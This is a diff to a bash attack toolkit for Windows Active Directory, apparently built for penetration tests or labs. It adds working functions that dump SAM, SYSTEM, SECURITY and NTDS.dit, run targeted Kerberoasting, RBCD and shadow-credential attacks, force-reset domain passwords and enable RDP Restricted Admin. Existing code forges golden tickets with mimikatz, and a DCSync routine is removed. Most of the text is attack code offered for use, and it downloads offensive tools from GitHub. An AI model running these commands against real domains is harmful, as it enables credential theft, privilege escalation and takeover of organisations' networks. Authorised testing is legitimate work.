@@ -5,7 +5,7 @@ source "$SCRIPTDIR/impacket.sh"
 source "$SCRIPTDIR/mimikatz.sh"
 source "$SCRIPTDIR/hashcat.sh"
 
-get_spray_passwords() {
+download_spray_passwords() {
     if [[ ! -f "Spray-Passwords.ps1" ]]; then
         cp $SCRIPTDIR/../ps1/Spray-Passwords.ps1 Spray-Passwords.ps1
     fi
@@ -13,7 +13,7 @@ get_spray_passwords() {
 
 }
 
-get_kerbrute() {
+download_kerbrute() {
     local kerbrute_url="https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe"
     if [[ ! -f "kerbrute_windows_amd64.exe" ]]; then
         wget "$kerbrute_url" -O kerbrute_windows_amd64.exe >> $trail_log
@@ -21,7 +21,7 @@ get_kerbrute() {
     generate_windows_download kerbrute_windows_amd64.exe
 }
 
-get_crackmapexec_windows() {
+download_crackmapexec_windows() {
     local crackmapexec_url="https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.4.0/cme-windows-latest-3.10.1.zip"
     if [[ ! -f "cme-windows-latest-3.10.1.zip" ]]; then
         wget "$crackmapexec_url" -O cme-windows-latest-3.10.1.zip >> $trail_log
@@ -33,9 +33,10 @@ get_crackmapexec_windows() {
     generate_windows_download cme.exe
 }
 
-get_rubeus() {
+download_rubeus() {
     if [[ ! -f "Rubeus.exe" ]]; then
-        cp /usr/share/windows-resources/rubeus/Rubeus.exe .
+        #cp /usr/share/windows-resources/rubeus/Rubeus.exe .
+        cp $SCRIPTDIR/../../tools/Rubeus/Rubeus/bin/Release/Rubeus.exe .
     fi
     generate_windows_download Rubeus.exe
 }
@@ -44,7 +45,7 @@ perform_kerberoast_rubeus() {
     if [[ -z "$hash_file" ]]; then
         hash_file="hashes.kerberoast"
     fi
-    get_rubeus
+    download_rubeus
     echo '.\Rubeus.exe kerberoast /outfile:'$hash_file';'
     upload_file $hash_file
 }
@@ -73,33 +74,8 @@ get_silverticket_command() {
 
 }
 
-get_dcsync_command() {
-    if [[ -z "$target_username" ]]; then
-        echo "Target username is required for DCSync command."
-        return 1
-    fi
-    if [[ -z "$hash_file" ]]; then
-        hash_file="hashes.dcsync"
-    fi
-    if [[ -z "$mimikatz_log" ]]; then
-        mimikatz_log="mimikatz_dcsync.log"
-    fi
-    get_mimikatz
-    echo '.\mimikatz.exe "lsadump::dcsync /user:'$target_username'" exit > '$mimikatz_log';'
-    upload_file "$mimikatz_log"
-    if [[ -f $mimikatz_log ]]; then
-        echo "DCSync command executed successfully, log saved to $mimikatz_log."
-        sudo dos2unix "$mimikatz_log"
-        ntlm_hash=$(grep -oP 'Hash NTLM: \K.*' $mimikatz_log | head -n 1)
-        echo "NTLM hash extracted: $ntlm_hash"
-        if [[ ! -z "$ntlm_hash" ]]; then
-            echo "$ntlm_hash" > "$hash_file"
-            hashcat_ntlm
-        fi
-    fi
-}
 
-perform_wmic_command() {
+get_wmic_command() {
     if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_ip" ]]; then
         echo "Username, password, and target IP address must be set before running WMIC command."
         return 1
@@ -112,7 +88,7 @@ perform_wmic_command() {
     echo "$wmic_command"
 }
 
-perform_wmic_powershell_command() {
+get_wmic_powershell_command() {
     if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_ip" ]]; then
         echo "Username, password, and target IP address must be set before running WMIC command."
         return 1
@@ -133,7 +109,7 @@ perform_wmic_powershell_command() {
 
 }
 
-perform_winrs_command() {
+get_winrs_command() {
     if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_ip" ]]; then
         echo "Username, password, and target IP address must be set before running WinRM command."
         return 1
@@ -146,7 +122,7 @@ perform_winrs_command() {
     echo "$winrs_command"
 }
 
-perform_powershell_remoting_command() {
+get_powershell_remoting_command() {
     if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_ip" ]]; then
         echo "Username, password, and target IP address must be set before running WinRM command."
         return 1
@@ -160,7 +136,7 @@ perform_powershell_remoting_command() {
     echo "$powershell_commands"
 }
 
-get_psexec() {
+download_psexec() {
     local pstools_link="https://download.sysinternals.com/files/PSTools.zip"
     if [[ ! -f  "PSTools.zip" ]]; then
         wget "$pstools_link" -O PSTools.zip >> $trail_log
@@ -174,7 +150,7 @@ get_psexec() {
     generate_windows_download "pstools/$PsExec_exe" "$PsExec_exe"
 }
 
-run_psexec() { 
+get_psexec_command() { 
     if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_hostname" ]]; then
         echo "Username, password, and target hostname address must be set before running PsExec command."
         return 1
@@ -193,7 +169,7 @@ run_psexec() {
 
 }
 
-perform_dcom() {
+get_dcom_command() {
     if [[ -z "$target_ip" ]]; then
         echo "Target IP address must be set before running DCOM command."
         return 1
@@ -207,7 +183,7 @@ perform_dcom() {
     echo "$powershell_command"   
 }
 
-get_golden_ticket() {
+get_golden_ticket_mimikatz() {
     target_username=krbtgt
     if ! get_ntlm_hash_from_mimikatz_log_lsadump; then
         echo "Failed to extract NTLM hash for $target_username."
@@ -227,7 +203,7 @@ get_golden_ticket() {
     echo '.\mimikatz.exe "kerberos::golden /user:'$username' /domain:'$domain' /sid:'$domain_sid' /'$target_username':'$ntlm_hash' /ptt" exit'
 }
 
-perform_gpo_changeowner_windows() {
+get_perform_gpo_changeowner_windows_command() {
     if [[ -z "$gpo_owner_username" ]] || [[ -z "$gpo_owner_password" ]] || [[ -z "$target_gpo" ]]; then
         echo "GPO owner username, password, and target IP address must be set before running GPO abuse."
         return 1
@@ -269,6 +245,31 @@ perform_gpo_abuse_linux() {
     popd || exit 1
 }
 
+perform_rbcd_linux() {
+    if [[ -z "$controlled_computer_name" ]]; then
+        echo "Controlled computer must be set before running RBCD."
+        return 1
+    fi
+    if [[ -z "$controlled_computer_pass" ]]; then
+        echo "Controlled computer password must be set before running RBCD."
+        return 1
+    fi
+    if [[ -z "$domain" ]] || [[ -z "$username" ]] ||  [[ -z "$password" ]]; then
+        echo "Domain, username, password must be set before running RBCD."
+        return 1
+    fi
+    if [[ -z "$target_system" ]]; then
+        echo "Target system must be set before running RBCD."
+        return 1
+    fi
+    if [[ -z "$dc_ip" ]]; then
+        echo "DC IP address must be set before running RBCD."
+        return 1
+    fi
+    echo rbcd.py -delegate-to "$target_system" -dc-ip "$dc_ip" -action read "$domain/$username:$password"
+
+    rbcd.py -delegate-to "$target_system" -dc-ip "$dc_ip" -action read "$domain/$username:$password"
+}
 # WinRM runs on 5985 by default
 run_evil_winrm() {
     if [[ -z "$target_ip" ]]; then
@@ -282,7 +283,7 @@ run_evil_winrm() {
     fi
     username_option="-u $username"
     local password_option=""
-    if [[ -z "$password" ]]; then
+    if [[ -z "$password" ]] || [[ $password == "''" ]]; then
         echo "Password is not set. Ensure you are passing hashes"        
         if [[ -z "$ntlm_hash" ]]; then
             echo "NTLM hash is not set. Please set it before running"
@@ -291,10 +292,10 @@ run_evil_winrm() {
             password_option="-H ${ntlm_hash^^}"
         fi  
     else
-        password_option="-p $password"
+        password_option="-p '$password'"        
     fi
-    if pgrep -f "evil-winrm -i $target_ip"; then
-        echo "Evil-WinRM is already running for $target_ip"
+    if pgrep -f "evil-winrm -i $target_ip -u $username"; then
+        echo "Evil-WinRM is already running for $target_ip, $username"
         return 0
     fi
     if [[ ! -z "$use_proxychain" ]] && [[ "$use_proxychain" == "true" ]]; then
@@ -304,10 +305,178 @@ run_evil_winrm() {
         proxychain_command=""
     fi
     echo ${proxychain_command}evil-winrm -i "$target_ip" "$username_option" "$password_option"
-    eval ${proxychain_command}evil-winrm -i "$target_ip" "$username_option" "$password_option" | tee >(remove_color_to_log >> $trail_log)
+    eval ${proxychain_command}evil-winrm -i "$target_ip" "$username_option" "$password_option" | tee >(remove_color_to_log >> $log_dir/evil_winrm_${target_ip}.log)
 
 }   
 
+target_kerberoast() {
+    echo "Running Kerberoasting..."
+    local url="https://github.com/ShutdownRepo/targetedKerberoast/archive/refs/heads/main.zip"
+    local targetedKerberoast_dir="targetedKerberoast"
+    if [[ ! -d $targetedKerberoast_dir ]]; then
+        echo "Downloading targetedKerberoast..."
+        wget -q -O "$targetedKerberoast_dir.zip" "$url"
+        unzip -q "$targetedKerberoast_dir.zip"
+        mv targetedKerberoast-main "$targetedKerberoast_dir"
+        rm "$targetedKerberoast_dir.zip"
+    fi
+    if [[ -z "$target_user" ]]; then
+        echo "Target user is not set. Please set it before running"
+        return 1
+    fi
+    if [[ -z "$domain" ]] || [[ -z "$username" ]] || [[ -z "$password" ]]; then
+        echo "Domain, username, password must be set before running"
+        return 1
+    fi
+    if [[ -z "$dc_ip" ]]; then
+        echo "DC IP address is not set. Please set it before running"
+        return 1
+    fi
+    pushd "$targetedKerberoast_dir" || exit 1
+    python3 targetedKerberoast.py -v -d "$domain" -u "$username" -p "$password" --dc-ip "$dc_ip" -o "$hash_file"
+    popd || exit 1
+    if [[ -f "$targetedKerberoast_dir/$hash_file" ]]; then
+        cp -f "$targetedKerberoast_dir/$hash_file" .
+    fi
+}
+
+get_regsave_commands() {
+
+    if [[ -z "$target_hostname" ]]; then
+        echo "Target hostname must be set before running get_regsave_commands"
+        return 1
+    fi
+    if [[ -z "$target_sam" ]]; then
+        target_sam=$target_hostname.sam.hive
+        echo "No target SAM provided, using default $target_sam"
+    fi
+    if [[ -z "$target_system" ]]; then
+        target_system=$target_hostname.system.hive
+        echo "No target SYSTEM provided, using default $target_system"
+    fi
+    echo "reg save hklm\system $target_system"
+    echo "reg save hklm\sam $target_sam"
+    upload_file $target_system
+    upload_file $target_sam
+    if [[ -z $target_security ]]; then
+        target_security=$target_hostname.security.hive
+        echo "No target SECURITY provided, using default $target_security"
+    fi
+    echo "reg save hklm\security $target_security"
+    upload_file "$target_security"
+ 
+}
+
+get_ntdsutil_commands() {
+    if [[ -z "$target_hostname" ]]; then
+        echo "Target hostname must be set before running get_ntdsutil_commands"
+        return 1
+    fi
+    if [[ -z "$target_system" ]]; then
+        target_system=$target_hostname.system.hive
+        echo "No target SYSTEM provided, using default $target_system"        
+    fi
+    if [[ -z "$target_ntds" ]]; then
+        target_ntds=$target_hostname.ntds.dit
+        echo "No target NTDS provided, using default $target_ntds"
+    fi
+    echo 'ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\NTDS" quit quit;'
+    upload_file "${target_ntds}" "c:\windows\temp\NTDS\Active Directory\ntds.dit"
+    upload_file "${target_system}" "c:\windows\temp\NTDS\registry\SYSTEM"
+
+}
+
 enable_rdp_commands() {
-    echo 'reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
+
+    echo 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /d 0 /t REG_DWORD;'
+    echo 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f;'
+}
+
+#change password using powerview
+
+change_password_powerview() {
+    if [[ -z "$domain" ]] || [[ -z "$username" ]] || [[ -z "$password" ]]; then
+        echo "Domain, username, and password must be set before running"
+        return 1
+    fi
+    if [[ -z "$target_username" ]] || [[ -z "$target_password" ]]; then
+        echo "You need to set the target username and password."
+        return 1
+    fi
+    download_powerview
+    echo "\$SecPassword = ConvertTo-SecureString '$password' -AsPlainText -Force"
+    echo "\$Cred = New-Object System.Management.Automation.PSCredential('$domain\\$username', \$SecPassword)"
+    echo "\$UserPassword = ConvertTo-SecureString '$target_password' -AsPlainText -Force"
+    echo "Set-DomainUserPassword -Identity $target_username -AccountPassword \$UserPassword -Credential \$Cred"
+}
+
+#change password using samba net
+
+change_password_samba() {
+    if [[ -z "$domain" ]] || [[ -z "$username" ]] || [[ -z "$password" ]]; then
+        echo "Domain, username, and password must be set before running"
+        return 1
+    fi
+    if [[ -z "$target_username" ]] || [[ -z "$target_password" ]]; then
+        echo "You need to set the target username and password."
+        return 1
+    fi
+    if [[ -z "$dc_host" ]]; then
+        echo "DC host is not set."
+        return 1
+    fi
+
+    local samba_command="net rpc password '$target_username' '$target_password' -U '$domain\\$username%$password' -S '$dc_host'"
+    echo "$samba_command"
+    eval "$samba_command" | tee -a $log_dir/samba_password_change.log
+
+}
+
+#shadow credentials
+#ca/pki needs to be setup to do this
+
+perform_shadow_credentials() {
+    local url="https://github.com/ShutdownRepo/pywhisker/archive/refs/heads/main.zip"
+    local pywhisker_dir="pywhisker"
+    if [[ ! -d $pywhisker_dir ]]; then
+        echo "Downloading pywhisker..."
+        wget -q -O "$pywhisker_dir.zip" "$url"
+        unzip -q "$pywhisker_dir.zip"
+        mv pywhisker-main "$pywhisker_dir"
+        rm "$pywhisker_dir.zip"
+    fi
+    pywhisker_dir="$pywhisker_dir/pywhisker"
+    if [[ -z "$domain" ]] || [[ -z "$username" ]] || [[ -z "$password" ]]; then
+        echo "Domain, username, and password must be set before running"
+        return 1
+    fi
+    if [[ -z "$target_username" ]]; then
+        echo "Target username must be set before running"
+        return 1
+    fi
+    pushd "$pywhisker_dir" || exit 1
+    echo python3 pywhisker.py -d "$domain" -u "$username" -p "$password" --target "'$target_username'" --action "add"
+    local result=$(python3 pywhisker.py -d "$domain" -u "$username" -p "$password" --target "'$target_username'" --action "add")
+    local pfx_file=$(echo "$result" | grep -oP 'at path: \K.*')
+    local pfx_password=$(echo "$result" | grep -oP 'with password: \K.*')
+    popd || exit 1
+    if [[ -z "$pfx_file" ]] || [[ -z "$pfx_password" ]]; then
+        echo "Failed to retrieve PFX file or password."
+        return 1
+    fi    
+    url="https://github.com/dirkjanm/PKINITtools/archive/refs/heads/master.zip"
+    local pkinittools_dir="PKINITtools"
+    if [[ ! -d $pkinittools_dir ]]; then
+        echo "Downloading PKINITtools..."
+        wget -q -O "$pkinittools_dir.zip" "$url"
+        unzip -q "$pkinittools_dir.zip"
+        mv PKINITtools-master "$pkinittools_dir"
+        rm "$pkinittools_dir.zip"
+    fi
+    if [[ -z $ccache_file ]]; then
+        ccache_file="${domain}_${target_username}.ccache"
+    fi
+    pushd "$pkinittools_dir" || exit 1
+    python3 gettgtpkinit.py -cert-pfx ../$pywhisker_dir/$pfx_file -pfx-pass $pfx_password "$domain/$target_username" "$ccache_file"
+    popd || exit 1
 }
